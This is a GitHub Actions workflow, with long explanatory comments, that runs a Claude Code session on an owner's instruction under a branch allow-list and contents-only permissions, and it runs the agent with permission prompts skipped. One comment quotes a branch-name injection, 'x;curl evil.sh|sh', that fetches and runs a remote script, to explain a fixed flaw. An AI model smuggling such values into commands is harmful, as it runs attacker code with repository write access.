# **The owner types, and this is what runs.**
#
# Phase 2 slice three (`docs/process/PHASE_2_SLICE_3_BRIEF.md`). Every other
# workflow in this repository checks work that already exists. This one *does*
# work, on his instruction, and it is the first thing in the project that can
# change the repository without a person at a keyboard.
#
# So the limits below are part of the machinery rather than promises about
# behaviour. An agent that means well and a workflow that refuses are different
# kinds of guarantee, and only the second survives an agent that does not.
#
# **It runs only when he starts it.** `workflow_dispatch` and nothing else: no
# schedule, no push trigger, no `workflow_run`. There is no path by which this
# starts itself.
#
# **It cannot run against `main`.** The first step fails if the ref is the
# default branch, before anything is installed and before any agent exists. The
# rule is in `CLAUDE.md` and in `constitution/authority.json` as an owner-only
# action; here it is also a job that exits 1.
#
# **It cannot merge, deploy or open a pull request.** `permissions` grants
# `contents: write` and nothing else — no `pull-requests`, no `actions: write`,
# no `id-token`. A step that tried would be refused by GitHub rather than by
# anyone's good intentions.
#
# **Before this can run at all**, the owner installs a credential himself, and it
# may be either of two. `CLAUDE_CODE_OAUTH_TOKEN` is a long-lived token he
# generates from his own Claude subscription with `claude setup-token`, and it
# carries **no per-run charge**: the work runs on what he already pays for.
# `ANTHROPIC_API_KEY` is the metered alternative and is charged per run. The
# subscription token is preferred where both exist, because the cheaper of two
# equivalent things should not need to be chosen deliberately every time.
#
# He installed the subscription token on 2026-09-10. No session creates, holds,
# sees or types either credential.

name: instruct

on:
  workflow_dispatch:
    inputs:
      instruction:
        description: What to do, in the owner's own words
        required: true
        type: string
      branch:
        description: The branch to work on. Never the default branch.
        required: true
        type: string

# Contents, and nothing else. Named exhaustively so that adding a permission is a
# visible edit to this block rather than an inherited default.
permissions:
  contents: write

concurrency:
  group: instruct-${{ github.repository }}
  cancel-in-progress: false

jobs:
  work:
    name: A session works on the owner's instruction
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      # 1. **The refusal, first.** Before the checkout, before the install,
      #    before anything exists that could act. `main` is not reachable from
      #    this workflow by any input.
      - name: Refuse the default branch
        env:
          TARGET: ${{ inputs.branch }}
          DEFAULT: ${{ github.event.repository.default_branch }}
        run: |
          if [ "$TARGET" = "$DEFAULT" ] || [ "$TARGET" = "main" ] || [ "$TARGET" = "master" ]; then
            echo "instruct: refusing to work on '$TARGET'. The default branch is the owner's alone."
            exit 1
          fi
          # **An allow-list, not a deny-list — the Keeper's KP2-06.**
          #
          # What stood here refused three shapes: `*/../*`, `*..*` and a leading
          # `-`. Everything else went through, into three `git push` lines and a
          # `node -e` string, unquoted. A branch named `x;curl evil.sh|sh` ran a
          # shell command; a branch containing a double quote closed the JSON
          # string and wrote whatever followed it into a script this workflow
          # executes with a token that can write to the repository.
          #
          # Naming the dangerous characters is the wrong direction: the list is
          # never finished, and the one nobody thought of is the one that gets
          # used. So this permits what a branch name actually needs and refuses
          # every other byte, including the space this repository's own branch
          # names never contain.
          case "$TARGET" in
            ""|-*|/*|*/|*..*|*//*) echo "instruct: '$TARGET' is not a branch name this workflow accepts."; exit 1 ;;
          esac
          if ! printf '%s' "$TARGET" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$'; then
            echo "instruct: '$TARGET' contains something this workflow will not put in a command."
            exit 1
          fi
          echo "instruct: working on '$TARGET'."

      - uses: actions/checkout@v5
        with:
          ref: ${{ inputs.branch }}
          fetch-depth: 0

      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v5
        with:
          node-version-file: .nvmrc
          cache: pnpm

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      # 2. **The room fills in before the agent starts, not after it finishes.**
      #    Written by the workflow rather than by the agent, so that it happens
      #    whether or not the agent remembers — which is the failure slice two's
      #    shelf life exists for. The agent may update it as it goes; this
      #    guarantees the first and last word.
      - name: Say that a session has started
        env:
          # **KP5-06.** Six of seven steps gained this block when KP2-06 moved
          # every value out of the command text and into the environment. This
          # one used `$RUN_ID` and declared nothing, so the note committed to the
          # room would have ended "Run ." — a mechanism saying something it
          # cannot support, inside the note whose own repair was about exactly
          # that. A test now requires every `$VAR` in a run block to be declared
          # in that step's env.
          RUN_ID: ${{ github.run_id }}
        run: |
          # **Virgil, not the Fabricator — the Keeper's KP2-15.** This wrote
          # `--holder fabricator` and then started an unscoped `claude -p` with
          # no work order, no permitted-paths contract and no acceptance
          # criteria. A Fabricator is a role with a boundary; what runs here is a
          # session. Reporting it as a Fabricator was the same mechanism, at the
          # same shelf life, saying something the run cannot support.
          #
          # `virgil` is the honest word the schema already has: the work is in
          # flight and is held between roles rather than at a station. The room
          # draws no station lit, which is true — no role has been given this —
          # and the note says what is actually happening.
          node scripts/virgil-status.mjs \
            --holder virgil --activity WORKING \
            --note "An unscoped session is working on the owner's instruction. It holds no work order and is not a Fabricator. Run $RUN_ID."

      # 3. **The instruction, written down before it is acted on.** Every change
      #    this workflow makes has a reason the owner can find, in his own words,
      #    beside the run that acted on it.
      - name: Record the instruction
        env:
          INSTRUCTION: ${{ inputs.instruction }}
          TARGET: ${{ inputs.branch }}
          RUN_ID: ${{ github.run_id }}
        run: |
          mkdir -p .virgil/instructions
          # Every value arrives through the environment. `INSTRUCTION` already
          # did — it is the owner's own prose and was never trusted — while the
          # branch beside it was pasted into the same string literal, which is
          # the whole of KP2-06: one field was treated as data and the field next
          # to it as code, in one JSON object.
          node -e '
            const fs = require("node:fs");
            const runId = process.env.RUN_ID;
            fs.writeFileSync(
              `.virgil/instructions/${runId}.json`,
              JSON.stringify(
                {
                  runId,
                  at: new Date().toISOString(),
                  branch: process.env.TARGET,
                  instruction: process.env.INSTRUCTION,
                },
                null,
                2,
              ) + "\n",
            );
          '

      - name: Commit the instruction and the status
        env:
          TARGET: ${{ inputs.branch }}
          RUN_ID: ${{ github.run_id }}
        run: |
          git config user.email "noreply@anthropic.com"
          git config user.name "Claude"
          git add .virgil
          git diff --staged --quiet || git commit -m "The owner's instruction, and a session picking it up

          Run $RUN_ID. Written before the work rather than after it, so
          that every change this run makes has a reason that can be found."
          git push origin "HEAD:$TARGET"

      # 4. **The agent.** It works under `CLAUDE.md` like any session here: one
      #    branch, no merge, no deploy, no other repository.
      #
      #    `--dangerously-skip-permissions` is what it sounds like and is named
      #    rather than hidden. There is no human at this keyboard to answer a
      #    prompt, so the alternative is a run that stalls until it times out.
      #    What makes it acceptable is everything above: a disposable container,
      #    a branch that is not `main`, a token that can only write contents, and
      #    a repository whose worst case is a branch the owner deletes.
      - name: Work on the instruction
        env:
          # Both are passed and neither is required. The subscription token is
          # what the owner installed; the API key is the metered fallback for
          # anyone who has one instead. Whichever is absent is an empty string,
          # which the CLI ignores.
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          INSTRUCTION: ${{ inputs.instruction }}
        run: |
          if [ -n "$CLAUDE_CODE_OAUTH_TOKEN" ]; then
            echo "instruct: running on the owner's Claude subscription. No per-run charge."
            unset ANTHROPIC_API_KEY
          elif [ -n "$ANTHROPIC_API_KEY" ]; then
            echo "instruct: running on a metered API key. This run is charged."
          else
            echo "instruct: no credential is installed, so no agent can run."
            echo "instruct: the instruction is recorded and committed; nothing else has happened."
            exit 1
          fi
          npm install -g @anthropic-ai/claude-code
          claude -p "$INSTRUCTION" --dangerously-skip-permissions

      - name: Commit whatever the session changed
        if: always()
        env:
          TARGET: ${{ inputs.branch }}
          RUN_ID: ${{ github.run_id }}
        run: |
          git add -A
          git diff --staged --quiet || git commit -m "The session's work on run $RUN_ID

          Made on the owner's instruction, recorded in
          .virgil/instructions/$RUN_ID.json."
          git push origin "HEAD:$TARGET"

      # 5. **And the room is told it stopped**, whatever happened — including
      #    when the step above failed. A run that ends leaving a Fabricator lit
      #    is the exact failure the shelf life was built for; this closes it at
      #    the source rather than waiting twenty minutes for it to go cold.
      - name: Say that the session has stopped
        if: always()
        env:
          TARGET: ${{ inputs.branch }}
          RUN_ID: ${{ github.run_id }}
          STATUS: ${{ job.status }}
        run: |
          node scripts/virgil-status.mjs --idle \
            --note "Run $RUN_ID finished with $STATUS. Nothing is in flight."
          git add .virgil
          git diff --staged --quiet || git commit -m "The session stopped, and the room says so

          Run $RUN_ID, $STATUS."
          git push origin "HEAD:$TARGET"
